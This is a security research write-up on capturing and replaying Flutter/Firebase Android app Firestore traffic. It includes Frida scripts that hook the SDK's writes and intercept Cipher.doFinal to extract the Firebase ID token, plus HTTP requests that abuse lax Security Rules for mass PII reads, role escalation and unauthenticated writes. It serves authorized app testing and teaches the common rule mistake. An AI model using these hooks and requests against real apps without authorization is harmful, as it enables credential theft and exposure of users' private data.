# Intercepting and tampering Firestore traffic

How to capture, edit, and replay a mobile app's Google Cloud Firestore traffic — and why normal proxies can't see it.

**Tool:** https://github.com/ibraradi/firestore-workbench

Target: a generic **Flutter + Firebase/Firestore Android app**. All names/paths below are placeholders.

## The problem

- Actions in the app were clearly reaching a backend — changes persisted and propagated across clients instantly — yet **no corresponding request appeared in the proxy**.
- Firestore mobile SDKs use a **persistent gRPC/HTTP-2 stream** of binary protobuf, not discrete REST calls. Proxies show one opaque connection, not individual reads/writes.

## Why Burp / HTTP proxies don't work

Each fix just exposes the next problem:

1. **No traffic reaches the proxy** — Flutter ignores the system proxy.
2. **Force it in → TLS fails** — Flutter's BoringSSL uses its own CA roots, so installing Burp's CA in Android doesn't help.
3. **Even decrypted, it's a stream** — one long gRPC/HTTP-2 connection of binary protobuf; Burp can't split, decode, or edit the ops inside it.

It's a protocol mismatch, not a config issue. So: intercept at the **SDK**, not the network.

## Architecture

- Firestore is a real-time layer: clients subscribe to docs and the server **pushes** changes — hence instant propagation.
- The data is reachable two ways: the **REST API** (plain HTTPS+JSON), and the **SDK** in the app.
- Plan: hook the SDK to **capture**, use REST to **replay**.

## Hooking the SDK with Frida

Release builds are obfuscated (R8), so classes are renamed. Find them **by signature** from the kept `FirebaseFirestore` entry point:

```js
const FF = Java.use('com.google.firebase.firestore.FirebaseFirestore');
// document()/collection() take a String and return the obfuscated ref classes.
// DocumentReference is the one with update(Map)->Task or set(Object, SetOptions)->Task.
let docRef = null;
FF.class.getDeclaredMethods()
  .filter(m => m.getParameterTypes().length === 1 &&
               m.getParameterTypes()[0].getName() === 'java.lang.String')
  .forEach(m => {
    const cn = m.getReturnType().getName();
    const isDoc = Java.use(cn).class.getDeclaredMethods().some(x => {
      const p = x.getParameterTypes(), rt = x.getReturnType().getName();
      return rt.includes('Task') &&
        ((p.length === 1 && p[0].getName() === 'java.util.Map') ||      // update(Map)
         (p.length === 2 && p[0].getName() === 'java.lang.Object'));    // set(Object, SetOptions)
    });
    if (isDoc) docRef = cn;
  });
```

Then hook `set`/`update` and report the path + data:

```js
const DR = Java.use(docRef);
DR.class.getDeclaredMethods().forEach(m => {
  const p = m.getParameterTypes().map(t => t.getName());
  const op = (p[0] === 'java.lang.Object') ? 'set'
           : (p.length === 1 && p[0] === 'java.util.Map') ? 'update' : null;
  if (!op) return;
  const ov = DR[m.getName()].overload(...p);
  ov.implementation = function () {
    send({ op, path: getPath(this), data: toJson(arguments[0]) });
    return ov.apply(this, arguments);
  };
});
```

> Note: discriminate `DocumentReference` by `update(Map)`/`set(Object, SetOptions)`. A naive "`(Object)->Task` method" check also matches `CollectionReference.add()` and misfires on non-obfuscated builds.

## Capturing the token

To replay authenticated, you need the app's Firebase ID token. What worked:

- ❌ Read from disk — encrypted at rest (Android Keystore).
- ❌ Hook the gRPC `Authorization` metadata — gRPC is shaded/obfuscated.
- ❌ `FirebaseAuth.getIdToken()` — init-timing and shading issues.
- ✅ **Hook the decryption.** The token is plaintext in memory after Firebase decrypts the user blob:

```js
const Cipher = Java.use('javax.crypto.Cipher');
Cipher.doFinal.overloads.forEach(ov => {
  ov.implementation = function () {
    const out = ov.apply(this, arguments);
    const s = '' + Java.use('java.lang.String').$new(out, 'UTF-8');
    const jwt = s.match(/eyJ[\w-]+\.[\w-]+\.[\w-]+/);   // Firebase ID token
    if (jwt) reportToken(jwt[0]);
    return out;
  };
});
```

This works regardless of obfuscation and needs no password. (Apps using **App Check** instead of a bearer token won't expose a replayable token — that's by design.)

## The tool: Firestore Workbench

A small local server + GUI:

- **Capture** — the Frida agent streams each write (path, data, project, token) in. Posts over a raw socket to bypass the cleartext-HTTP policy.
- **Repeater** — click a capture → edit path/data/auth → replay over the Firestore REST API. Encodes/decodes Firestore's typed values; an IDOR helper swaps the doc id; auth can be toggled off.
- **Burp** — with `--proxy`, replays route through Burp into history/Repeater. (Captures don't traverse Burp; only replays do.) For bearer-token apps it auto-adopts the token and auto-fills the project from the token's `aud` claim.

## Representative findings (anonymized)

- **Collection-wide PII read — Critical.** Rules allowed any signed-in user to list a whole user-profile collection. Cause: read scoped to "is authenticated" instead of "is owner."
- **All private conversations readable — High.** One query returned every conversation + participants. Same cause.
- **Role escalation via a self-writable field — Medium.** Client writes its own profile doc; rules didn't validate fields, so a user could set a role field and reach restricted channels.
- **Unauthenticated write to telemetry — Medium.** On a second app: telemetry collections were world-writable (unauth read 403, unauth write 200) → log/audit poisoning.

Each is a one-line repro (placeholders):

```http
# 1) list a whole collection
GET /v1/projects/<project>/databases/(default)/documents/profiles HTTP/1.1
Authorization: Bearer <any-user-token>
```
```http
# 2) read all conversations
POST /v1/projects/<project>/databases/(default)/documents:runQuery HTTP/1.1
Authorization: Bearer <any-user-token>

{ "structuredQuery": { "from": [ { "collectionId": "messages" } ] } }
```
```http
# 3) set a role on your own profile, then read a restricted resource
PATCH /v1/projects/<project>/databases/(default)/documents/profiles/<your-uid>?updateMask.fieldPaths=role HTTP/1.1
Authorization: Bearer <your-token>

{ "fields": { "role": { "stringValue": "<elevated-role>" } } }
```
```http
# 4) write a telemetry doc with NO auth — accepted (200)
PATCH /v1/projects/<project>/databases/(default)/documents/<telemetry>/<id>?updateMask.fieldPaths=x HTTP/1.1

{ "fields": { "x": { "stringValue": "anyone" } } }
```

Common thread: **in Firebase, the Security Rules are the entire authorization layer** — test them by reading/writing/querying Firestore directly.

## Takeaways

- Firebase pushes trust to the client; test rules at field, cross-user, and per-collection level.
- gRPC defeats request/response proxies — use SDK hooks or the REST API.
- Beat obfuscation with signature-based discovery (validate against multiple builds).
- To grab a secret, hook where it's used in plaintext (`Cipher.doFinal`).

## References

- Firestore rules — get started: https://firebase.google.com/docs/firestore/security/get-started
- Firestore rules — overview: https://firebase.google.com/docs/firestore/security/overview
- Frida: https://frida.re/

The most common rule mistake: `allow read, write: if request.auth != null` (any signed-in user) instead of `if request.auth.uid == userId` (owner only). That single line is behind every finding above.

## Toolkit

**Repo: https://github.com/ibraradi/firestore-workbench**

- `firestore_workbench.py` — server + GUI (capture, replay, Burp routing).
- `firestore_agent.js` — Frida agent (signature discovery, write hooks, token capture).
- `extras/redirect_to_burp.js` — optional: route an app's non-Firestore REST traffic into Burp.

Use only against apps you are authorized to test.
